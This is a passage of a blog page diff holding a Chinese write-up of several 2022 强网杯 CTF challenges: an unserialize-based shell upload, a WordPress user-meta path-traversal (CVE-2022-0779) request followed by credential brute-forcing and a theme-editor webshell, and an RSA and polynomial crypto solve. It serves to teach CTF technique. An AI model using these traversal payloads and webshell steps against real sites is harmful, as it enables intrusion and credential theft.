+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <h2 id="写在前面">写在前面</h2>
+<p>强网杯不亏称为强Pwn杯，17道Pwn题；往年什么情况不知道，今年好多复现CVE的题目，其他题是否有CVE暂时不知，目前遇到的只有这几个。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>myJWT CVE-2022-21449</span></span>
+<span class="line" data-line="2"><span>WP-UM CVE-2022-0779</span></span>
+<span class="line" data-line="3"><span>easylogin CVE-2022-21661</span></span></code></pre>
+<!--more-->
+<h2 id="强网先锋">强网先锋</h2>
+<h3 id="rcefile">rcefile</h3>
+<p>扫描到 <code>www.zip</code> ，通过测试发现</p>
+<ol>
+<li>检查后缀和 <code>content-type</code> ，文件名是随机字符串</li>
+<li>数据存储于 <code>cookie</code> 中，通过 <code>反序列化函数</code>  还原并显示</li>
+</ol>
+<p>关键点在于 <code>config.inc.php</code> 文件中的 <code>spl_autoload_register()</code> 函数</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">spl_autoload_register</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">error_reporting</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#F97583">function</span><span style="color:#B392F0"> e</span><span style="color:#E1E4E8">($str){</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> htmlspecialchars</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">$userfile </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> empty</span><span style="color:#E1E4E8">($_COOKIE[</span><span style="color:#9ECBFF">"userfile"</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> [] </span><span style="color:#F97583">:</span><span style="color:#79B8FF"> unserialize</span><span style="color:#E1E4E8">($_COOKIE[</span><span style="color:#9ECBFF">"userfile"</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">?></span></span>
+<span class="line" data-line="10"><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF">p</span><span style="color:#F97583">></span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    &#x3C;</span><span style="color:#79B8FF">a</span><span style="color:#79B8FF"> href</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"/index.php"</span><span style="color:#F97583">></span><span style="color:#79B8FF">Index</span><span style="color:#F97583">&#x3C;/</span><span style="color:#79B8FF">a</span><span style="color:#F97583">></span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    &#x3C;</span><span style="color:#79B8FF">a</span><span style="color:#79B8FF"> href</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"/showfile.php"</span><span style="color:#F97583">></span><span style="color:#79B8FF">files</span><span style="color:#F97583">&#x3C;/</span><span style="color:#79B8FF">a</span><span style="color:#F97583">></span></span>
+<span class="line" data-line="13"><span style="color:#F97583">&#x3C;/</span><span style="color:#79B8FF">p</span><span style="color:#F97583">></span></span></code></pre>
+<p><code>spl_autoload_register()</code>如果不指定处理用的函数，就会自动包含 <code>类名.php</code> 或 <code>类名.inc</code> 的文件，并加载其中的 <code>类名</code> 类</p>
+<p>通过源码看到黑名单中没有 <code>.inc</code> ，所以我们可以通过 <code>.inc</code> 文件来实现Getshell</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#E1E4E8">$blackext </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">"php"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"php5"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"php3"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"html"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"swf"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"htm"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"phtml"</span><span style="color:#E1E4E8">];</span></span></code></pre>
+<p>我们可以看到上传后，响应包里出现了一段 <code>userfile</code> 的 <code>cookie</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Set-Cookie: userfile=a:1:{i:0;s:36:"340d9b3c0f5d7eff1c077d2ecd8c1c19.inc";}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730185455774.png" alt="image-20220730185455774"></p>
+<p>然后我们序列化一个类名为 <code>340d9b3c0f5d7eff1c077d2ecd8c1c19</code> 的对象</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#79B8FF"> 340d9b3c0f5d7eff1c077d2ecd8c1c19</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">$flag </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#E1E4E8"> 340</span><span style="color:#79B8FF">d9b3c0f5d7eff1c077d2ecd8c1c19</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> serialize</span><span style="color:#E1E4E8">($flag);</span></span>
+<span class="line" data-line="7"><span style="color:#6A737D">// O:32:"340d9b3c0f5d7eff1c077d2ecd8c1c19":0:{}</span></span></code></pre>
+<p>直接在 <code>cookie</code> 中添加我们新生成的 <code>反序列化</code> 字符串即可</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730185617193.png" alt="image-20220730185617193"></p>
+<h3 id="wp_um">WP_UM</h3>
+<p>访问环境，出现一个引导安装页面，感觉有用的信息就是下面这段</p>
+<blockquote>
+<p>猫哥最近用wordpress搭建了一个个人博客，粗心的猫哥因为记性差，所以把管理员10位的账号作为文件名放在/username下和15位的密码作为文件名放在/password下。
+并且存放的时候猫哥分成一个数字(作为字母在密码中的顺序)＋一个大写或小写字母一个文件，例如admin分成5个文件，文件名是1a 2d 3m 4i 5n
+这几天他发现了一个特别好用的wordpress插件，在他开心的时候，可是倒霉的猫哥却不知道危险的存在。</p>
+</blockquote>
+<p>这段信息说插件有问题，然后题目附件里发现就俩插件 <code>akismet</code> 和 <code>user-meta</code></p>
+<p>根据 <code>user-meta</code> 插件的版本 <code>2.4.3</code> 搜到了一个路径遍历漏洞 <code>CVE-2022-0779</code>，正好可以组合起来得到账号密码。</p>
+<p>请求包里的 <code>pf_noncee</code> 需要改成当前 <code>pf_noncee</code> ，获取方法：在网站首页查看页面源代码，搜索 <code>pf_nonce</code> 即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line" data-line="1"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> /wp-admin/admin-ajax.php </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line" data-line="2"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> eci-2ze2ahooasrbklrp7npz.cloudeci1.ichunqiu.com</span></span>
+<span class="line" data-line="3"><span style="color:#85E89D">Upgrade-Insecure-Requests</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 1</span></span>
+<span class="line" data-line="4"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
+<span class="line" data-line="5"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="line" data-line="6"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line" data-line="7"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> zh-CN,zh;q=0.9</span></span>
+<span class="line" data-line="8"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line" data-line="9"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/x-www-form-urlencoded</span></span>
+<span class="line" data-line="10"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 159</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">field_name=test&#x26;filepath=/../../../../../../../../username/1M&#x26;field_id=um_field_4&#x26;form_key=Upload&#x26;action=um_show_uploaded_file&#x26;pf_nonce=e74a0c7bd4&#x26;is_ajax=true</span></span></code></pre>
+<p>我们可以发现，如果路径存在那么会有一个 <code>Remove</code> 反之没有</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731212031379.png" alt="image-20220731212031379"></p>
+<p>账号( <code>10</code> 位)密码( <code>15</code> 位)，这些信息题目提都提到了，我们直接 <code>burp</code> 爆破 <code>a-z</code> , <code>A-Z</code> 即可，另外博客文章内泄露了用户名，同时爆破的时候发现第一位是 <code>M</code> 简单猜测了几位，所以说实际上只爆破了密码的第 <code>6</code> 位到第 <code>15</code> 位，还是挺快的。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>用户名：MaoGePaMao</span></span>
+<span class="line" data-line="2"><span>密码：MaoGeYaoQiFeiLa</span></span></code></pre>
+<p>登录后台，<code>外观</code> -> <code>主题文件编辑器</code> 处写shell (本意是直接写一句话，但是好像过滤了引号)，直接写个一句话到其他文件吧)</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731212638338.png" alt="image-20220731212638338"></p>
+<p>他说 <code>flag</code> 藏起来了，连上蚁剑翻了半天，最后发现在 <code>/usr/local/This_1s_secert</code> <s>找flag找了半天，不然一血就是我的(小声bb，只拿到了三血</s></p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731105857684.png" alt="image-20220731105857684"></p>
+<h3 id="asr">ASR</h3>
+<p>下载附件得到一个 <code>python</code> 脚本</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Util.number </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> getPrime</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> secret </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> falg</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">pad </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> s:s </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> bytes</span><span style="color:#E1E4E8">([(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(s)</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">%</span><span style="color:#79B8FF">16</span><span style="color:#F97583">+</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">((</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(s)</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">%</span><span style="color:#79B8FF">16</span><span style="color:#F97583">+</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">n </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> getPrime(</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> getPrime(</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> getPrime(</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> getPrime(</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">e </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 3</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pad(flag)</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(flag)</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">assert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(flag) </span><span style="color:#F97583">>=</span><span style="color:#79B8FF"> 48</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">m </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> int</span><span style="color:#E1E4E8">.from_bytes(flag,</span><span style="color:#9ECBFF">'big'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(m,e,n)</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">'n = </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">n</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">'e = </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">e</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="16"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">'c = </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">c</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#9ECBFF">'''</span></span>
+<span class="line" data-line="19"><span style="color:#9ECBFF">n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span>
+<span class="line" data-line="20"><span style="color:#9ECBFF">e = 3</span></span>
+<span class="line" data-line="21"><span style="color:#9ECBFF">c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span>
+<span class="line" data-line="22"><span style="color:#9ECBFF">'''</span></span></code></pre>
+<p>我们先用 <code>factordb</code> 把 <code>n</code> 分解一下，得到</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>p1 = 218566259296037866647273372633238739089</span></span>
+<span class="line" data-line="2"><span>p2 = 223213222467584072959434495118689164399</span></span>
+<span class="line" data-line="3"><span>p3 = 225933944608558304529179430753170813347</span></span>
+<span class="line" data-line="4"><span>p4 = 260594583349478633632570848336184053653</span></span></code></pre>
+<p><code>e|p1-1|p3-1</code>，需要代替，进行一些尝试得出 <code>n</code> 也可以近似等于 <code>p2**2*p4**2</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> gmpy2</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Util.number </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> long_to_bytes</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">n </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">e </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 3</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">p1 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 218566259296037866647273372633238739089</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">p2 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 223213222467584072959434495118689164399</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">p3 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 225933944608558304529179430753170813347</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">p4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 260594583349478633632570848336184053653</span></span>
+<span class="line" data-line="12"></span>
+<span class="line" data-line="13"><span style="color:#F97583">assert</span><span style="color:#E1E4E8">(n</span><span style="color:#F97583">==</span><span style="color:#E1E4E8">(p1</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p2</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p3</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p4)</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.invert(e, (p2</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p2</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p4</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">(p4</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(long_to_bytes(</span><span style="color:#79B8FF">pow</span><span style="color:#E1E4E8">(c, data, p2</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p4</span><span style="color:#F97583">**</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)))</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#6A737D"># flag{Fear_can_hold_you_prisoner_Hope_can_set_you_free}</span></span></code></pre>
+<h3 id="polydiv">polydiv</h3>
+<p>这个也就是两套而已，第一层的md5好过，本想手动输入，却发现时间不够，考察pwn的使用起到交互的作用，第一层md5过去了，然后第二层在整数环中的多项式乘除法，可以使用 <code>sagemath</code> 中的相关函数进行 <code>求解</code> 运算，得到相应的数据进行 <code>40</code> 轮爆破求解即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> string</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> hashlib </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> itertools</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> sage.all </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">strs </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> string.ascii_letters </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> string.digits</span></span>
+<span class="line" data-line="7"><span style="color:#79B8FF">PR</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> PolynomialRing(Zmod(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">), </span><span style="color:#FFAB70">name</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'x'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">x </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> PR</span><span style="color:#E1E4E8">.gen()</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#F97583">def</span><span style="color:#B392F0"> proof</span><span style="color:#E1E4E8">(end,sha):</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    num</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    slist</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">itertools.permutations(strs,</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(num))</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> slist:</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">        i </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(i)</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> sha256((i </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> end.decode()).encode()).hexdigest()</span><span style="color:#F97583">==</span><span style="color:#E1E4E8">sha.decode():</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> i</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#F97583">def</span><span style="color:#B392F0"> poly</span><span style="color:#E1E4E8">(s):</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">    data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line" data-line="20"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> s[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> '1'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">        data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    if</span><span style="color:#9ECBFF"> 'x'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> s.replace(</span><span style="color:#9ECBFF">'x^'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">        data </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> x</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">        if</span><span style="color:#79B8FF"> str</span><span style="color:#E1E4E8">(i) </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> s:</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">            data </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> x</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">i</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> data</span></span>
+<span class="line" data-line="28"></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">io </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">'39.107.137.85'</span><span style="color:#E1E4E8"> ,</span><span style="color:#79B8FF">41366</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">context.log_level </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'debug'</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">io.recvuntil(</span><span style="color:#9ECBFF">'sha256(XXXX+'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">message</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">io.recvuntil(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">end </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> message[:</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="34"><span style="color:#79B8FF">SHA</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> message[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">:]</span></span>
